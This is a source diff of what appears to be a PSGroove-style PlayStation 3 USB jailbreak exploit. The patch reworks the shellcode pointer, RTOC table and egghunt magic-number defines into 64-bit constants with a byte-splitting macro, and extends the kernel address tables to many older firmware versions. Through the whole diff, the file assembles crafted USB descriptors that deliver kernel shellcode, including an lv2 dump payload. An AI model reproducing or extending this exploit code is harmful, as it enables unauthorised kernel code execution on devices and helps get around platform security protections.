@@ -19,35 +19,60 @@
 
 #include "PL3/shellcode_egghunt.h"
 
-
-#define MAGIC_NUMBER		0x50, 0x53, 0x47, 0x72, 0x6f, 0x6f, 0x76, 0x65
+#define MAGIC_NUMBER		0x505347726f6f7665
 
 #if defined (FIRMWARE_3_41)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xe7, 0x20
+#define RTOC_TABLE		0x800000000033e720
 #elif defined (FIRMWARE_3_41_KIOSK)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xe7, 0x20
+#define RTOC_TABLE		0x800000000033e720
 #elif defined (FIRMWARE_3_40)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xe7, 0x20
+#define RTOC_TABLE		0x800000000033e720
 #elif defined (FIRMWARE_3_30)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xdb, 0xc0
+#define RTOC_TABLE		0x800000000033dbc0
 #elif defined (FIRMWARE_3_21)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xda, 0x90
+#define RTOC_TABLE		0x800000000033da90
 #elif defined (FIRMWARE_3_15)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xda, 0x10
+#define RTOC_TABLE		0x800000000033da10
 #elif defined (FIRMWARE_3_10)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xda, 0x10
+#define RTOC_TABLE		0x800000000033da10
 #elif defined (FIRMWARE_3_01)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x32, 0x06, 0x40
+#define RTOC_TABLE		0x8000000000320640
 #elif defined (FIRMWARE_2_76)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x31, 0x3E, 0x70
+#define RTOC_TABLE		0x8000000000313e70
 #elif defined (FIRMWARE_2_70)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x31, 0x3e, 0x70
+#define RTOC_TABLE		0x8000000000313e70
 #elif defined (FIRMWARE_2_60)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x30, 0x4f, 0x60
+#define RTOC_TABLE		0x8000000000304f60
 #elif defined (FIRMWARE_2_53)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x30, 0x42, 0xa0
+#define RTOC_TABLE		0x80000000003042a0
+#elif defined (FIRMWARE_2_52)
+#define RTOC_TABLE		0x8000000000304220
+#elif defined (FIRMWARE_2_50)
+#define RTOC_TABLE		0x80000000003041a0
 #elif defined (FIRMWARE_2_43)
-#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x40
+#define RTOC_TABLE		0x800000000031ff40
+#elif defined (FIRMWARE_2_42)
+#define RTOC_TABLE		0x800000000031f660
+#elif defined (FIRMWARE_2_41)
+#define RTOC_TABLE		0x800000000031f660
+#elif defined (FIRMWARE_2_40)
+#define RTOC_TABLE		0x800000000031f660
+#elif defined (FIRMWARE_2_36)
+#define RTOC_TABLE		0x80000000003a4ed0
+#elif defined (FIRMWARE_2_35)
+#define RTOC_TABLE		0x80000000003a4ed0
+#elif defined (FIRMWARE_2_30)
+#define RTOC_TABLE		0x80000000003a4ed0
+#elif defined (FIRMWARE_2_20)
+#define RTOC_TABLE		0x80000000003a4ed0
+#elif defined (FIRMWARE_2_17)
+#define RTOC_TABLE		0x80000000003afcb0
+#elif defined (FIRMWARE_2_16)
+#define RTOC_TABLE		0x80000000003aff00
+#elif defined (FIRMWARE_2_10)
+#define RTOC_TABLE		0x80000000003aff00
+#elif defined (FIRMWARE_2_01)
+#define RTOC_TABLE		0x80000000003aa860
 #else
 #error You must specify the target firmware. Define a supported FIRMWARE_X_YZ in Makefile
 #endif /* FIRMWARE_X_YZ */
@@ -63,47 +88,86 @@
 
 #if defined (FIRMWARE_3_41)
 #define FIRMWARE 3_41
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xee, 0x70
+#define SHELLCODE_ADDR_BASE	0x80000000003dee70
 #elif defined (FIRMWARE_3_41_KIOSK)
 #define FIRMWARE 3_41_kiosk
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xee, 0x70
+#define SHELLCODE_ADDR_BASE	0x80000000003dee70
 #elif defined (FIRMWARE_3_40)
 #define FIRMWARE 3_40
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xee, 0x70
+#define SHELLCODE_ADDR_BASE	0x80000000003dee70
 #elif defined (FIRMWARE_3_30)
 #define FIRMWARE 3_30
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xde, 0x70
+#define SHELLCODE_ADDR_BASE	0x80000000003dde70
 #elif defined (FIRMWARE_3_21)
 #define FIRMWARE 3_21
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xde, 0x30
+#define SHELLCODE_ADDR_BASE	0x80000000003dde30
 #elif defined (FIRMWARE_3_15)
 #define FIRMWARE 3_15
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xde, 0x30
+#define SHELLCODE_ADDR_BASE	0x80000000003dde30
 #elif defined (FIRMWARE_3_10)
 #define FIRMWARE 3_10
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xde, 0x30
+#define SHELLCODE_ADDR_BASE	0x80000000003dde30
 #elif defined (FIRMWARE_3_01)
 #define FIRMWARE 3_01
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3B, 0xFB, 0xC8
+#define SHELLCODE_ADDR_BASE	0x80000000003bfbc8
 #elif defined (FIRMWARE_2_76)
 #define FIRMWARE 2_76
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3B, 0x1B, 0xC8
+#define SHELLCODE_ADDR_BASE	0x80000000003b1bc8
 #elif defined (FIRMWARE_2_70)
 #define FIRMWARE 2_70
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3b, 0x1b, 0xc8
+#define SHELLCODE_ADDR_BASE	0x80000000003b1bc8
 #elif defined (FIRMWARE_2_60)
 #define FIRMWARE 2_60
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3a, 0x2b, 0xa8
+#define SHELLCODE_ADDR_BASE	0x80000000003a2ba8
 #elif defined (FIRMWARE_2_53)
 #define FIRMWARE 2_53
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3a, 0x2b, 0xa8
+#define SHELLCODE_ADDR_BASE	0x80000000003a2ba8
+#elif defined (FIRMWARE_2_52)
+#define FIRMWARE 2_52
+#define SHELLCODE_ADDR_BASE	0x80000000003a1ba8
+#elif defined (FIRMWARE_2_50)
+#define FIRMWARE 2_50
+#define SHELLCODE_ADDR_BASE	0x80000000003a1ba8
 #elif defined (FIRMWARE_2_43)
 #define FIRMWARE 2_43
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x3b, 0xeb, 0xa8
+#define SHELLCODE_ADDR_BASE	0x80000000003beba8
+#elif defined (FIRMWARE_2_42)
+#define FIRMWARE 2_42
+#define SHELLCODE_ADDR_BASE	0x80000000003beba8
+#elif defined (FIRMWARE_2_41)
+#define FIRMWARE 2_41
+#define SHELLCODE_ADDR_BASE	0x80000000003beba8
+#elif defined (FIRMWARE_2_40)
+#define FIRMWARE 2_40
+#define SHELLCODE_ADDR_BASE	0x80000000003beba8
+#elif defined (FIRMWARE_2_36)
+#define FIRMWARE 2_36
+#define SHELLCODE_ADDR_BASE	0x8000000000476cf8
+#elif defined (FIRMWARE_2_35)
+#define FIRMWARE 2_35
+#define SHELLCODE_ADDR_BASE	0x8000000000476cf8
+#elif defined (FIRMWARE_2_30)
+#define FIRMWARE 2_30
+#define SHELLCODE_ADDR_BASE	0x8000000000476cf8
+#elif defined (FIRMWARE_2_20)
+#define FIRMWARE 2_20
+#define SHELLCODE_ADDR_BASE	0x8000000000476cf8
+#elif defined (FIRMWARE_2_17)
+#define FIRMWARE 2_17
+#define SHELLCODE_ADDR_BASE	0x8000000000482c68
+#elif defined (FIRMWARE_2_16)
+#define FIRMWARE 2_16
+#define SHELLCODE_ADDR_BASE	0x8000000000482c68
+#elif defined (FIRMWARE_2_10)
+#define FIRMWARE 2_10
+#define SHELLCODE_ADDR_BASE	0x8000000000482c68
+#elif defined (FIRMWARE_2_01)
+#define FIRMWARE 2_01
+#define SHELLCODE_ADDR_BASE	0x800000000047cc50
 #endif /* FIRMWARE_X_YZ */
 
 
-#define SHELLCODE_PAGE		0x80, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00
+#define SHELLCODE_PAGE		0x8000000000400000
 #define SHELLCODE_DESTINATION	SHELLCODE_ADDR_BASE
 #define SHELLCODE_PTR 		SHELLCODE_ADDR_BASE + 0x08
 #define SHELLCODE_ADDRESS	SHELLCODE_ADDR_BASE + 0x18
@@ -116,7 +180,7 @@
 
 #define PAYLOAD dump_lv2
 
-#define SHELLCODE_ADDR_BASE	0x80, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x00, 0x00
+#define SHELLCODE_ADDR_BASE	0x80000000004e0000
 
 #define SHELLCODE_PAGE		SHELLCODE_ADDR_BASE
 #define SHELLCODE_DESTINATION	SHELLCODE_ADDR_BASE + 0x20
@@ -152,6 +216,16 @@
 #endif
 
 
+#define SPLIT64_TO8(arg_)	\
+	(uint8_t)(((arg_) >> 8 * 7) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 6) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 5) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 4) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 3) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 2) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 1) & 0xff), \
+	(uint8_t)(((arg_) >> 8 * 0) & 0xff)
+
 #define PORT1_DESC_LEN		0x1000
 #define PORT1_DESC_LEN_HI	((PORT1_DESC_LEN >> 8) & 0xFF)
 #define PORT1_DESC_LEN_LO	(PORT1_DESC_LEN & 0xFF)
@@ -161,9 +235,9 @@
 #define PORT3_DESC_LEN_LO	(PORT3_DESC_LEN & 0xFF)
 
 const uint8_t PROGMEM jig_response[64] = {
-	SHELLCODE_PTR,
-	SHELLCODE_ADDRESS,
-	RTOC_TABLE,
+	SPLIT64_TO8(SHELLCODE_PTR),
+	SPLIT64_TO8(SHELLCODE_ADDRESS),
+	SPLIT64_TO8(RTOC_TABLE),
 	default_shellcode_macro,
 };
 
@@ -204,11 +278,11 @@ const uint8_t PROGMEM port1_config_descriptor[] = {
 	0x09, 0x02, 0x12, 0x00, 0x01, 0x00, 0x00, 0x80, 0xfa,
 	0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01, 0x02, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	MAGIC_NUMBER,
+	SPLIT64_TO8(MAGIC_NUMBER),
 #ifndef USE_JIG
-	SHELLCODE_PTR,
-	SHELLCODE_ADDRESS,
-	RTOC_TABLE,
+	SPLIT64_TO8(SHELLCODE_PTR),
+	SPLIT64_TO8(SHELLCODE_ADDRESS),
+	SPLIT64_TO8(RTOC_TABLE),
 #endif
 	default_payload_macro,
 };
@@ -555,9 +629,9 @@ const uint8_t PROGMEM port4_config_descriptor_2[] = {
 const uint8_t PROGMEM port4_config_descriptor_3[] = {
 	0x09, 0x02, 0x30, 0x00, 0x01, 0x01, 0x00, 0x80, 0x01, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01,
 	0x02, 0x00, 0x3e, 0x21, 0x00, 0x00, 0x00, 0x00,
-	MAGIC_NUMBER, /* magic number to look for in the start of the page */
-	SHELLCODE_PAGE, /* Initial data search ptr */
-	SHELLCODE_DESTINATION, /* destination ptr for heap structure (jig response) */
+	SPLIT64_TO8(MAGIC_NUMBER), /* magic number to look for in the start of the page */
+	SPLIT64_TO8(SHELLCODE_PAGE), /* Initial data search ptr */
+	SPLIT64_TO8(SHELLCODE_DESTINATION), /* destination ptr for heap structure (jig response) */
 };
 
 const uint8_t PROGMEM port5_device_descriptor[] = {
